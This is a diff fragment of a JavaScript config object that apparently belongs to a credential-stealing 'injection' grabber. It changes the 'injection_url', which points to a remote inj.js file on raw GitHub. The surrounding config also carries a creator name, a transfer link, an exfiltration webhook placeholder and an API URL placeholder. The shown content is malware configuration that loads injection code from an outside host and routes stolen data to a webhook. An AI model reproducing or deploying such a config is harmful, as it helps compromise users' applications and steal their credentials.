@@ -19,7 +19,7 @@ var config = {
 
     creator: "JunkieOpfer",
     transfer_link: `%TRANSFER_URL%`,
-    injection_url: "https://raw.githubusercontent.com/JunkieOpfer/injection/main/inj.js",
+    injection_url: "https://raw.githubusercontent.com/JunkieOpfer/star/main/injection/inj.js",
     webhook: "%WEBHOOK%",
     Placed: "%API_URL%",
     Filter: {
